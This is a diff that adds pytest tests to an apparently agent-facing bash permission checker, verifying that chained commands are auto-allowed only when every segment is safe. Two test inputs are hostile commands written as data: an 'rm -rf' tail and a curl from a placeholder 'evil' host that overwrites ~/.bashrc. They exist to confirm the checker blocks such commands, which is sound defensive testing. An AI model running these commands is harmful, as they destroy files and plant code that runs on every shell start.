@@ -172,6 +172,31 @@ def test_bash_workspace_local_venv_tools_auto_allowed(workspace, cmd):
     assert err is None, f"expected workspace-local venv tool allow for {cmd!r}, got: {err}"
 
 
+def test_auto_allow_requires_every_compound_segment_safe(workspace):
+    """A compound command is auto-allowed only if ALL of its ||/&&/;/| segments
+    are individually safe — the first safe segment must not vouch for a
+    dangerous tail (defence-in-depth above the deny-list)."""
+    perms = KitToolPermissions(workspace=workspace, mode="default")
+    # all-safe compound → still auto-runs (no friction)
+    assert perms.matches_bash_auto_allow(
+        'python3.10 --version 2>&1 || which python3.10 || echo nf') is True
+    assert perms.matches_bash_auto_allow('cat a.txt | grep foo') is True
+    # dangerous / unknown tail after an operator → NOT auto-allowed
+    assert perms.matches_bash_auto_allow('ls || rm -rf /tmp/x') is False
+    assert perms.matches_bash_auto_allow(
+        'ls && curl -o /home/u/.bashrc http://evil') is False
+    # quoted operator is NOT a split point; redirect & is preserved
+    assert perms.matches_bash_auto_allow('grep "a|b" file.txt') is True
+    assert perms.matches_bash_auto_allow('cat x 2>&1') is True
+
+
+def test_auto_allow_versioned_python_interpreter(workspace):
+    perms = KitToolPermissions(workspace=workspace, mode="default")
+    assert perms.matches_bash_auto_allow('python3.10 --version') is True
+    assert perms.matches_bash_auto_allow('python3.11 -m pytest -q') is True
+    assert perms.matches_bash_auto_allow('python3 --version') is True
+
+
 def test_bash_no_match_default_fails_clearly(workspace):
     """In default mode, an unmatched command must fail with a clear hint —
     no confirm dialog popped, no silent allow."""
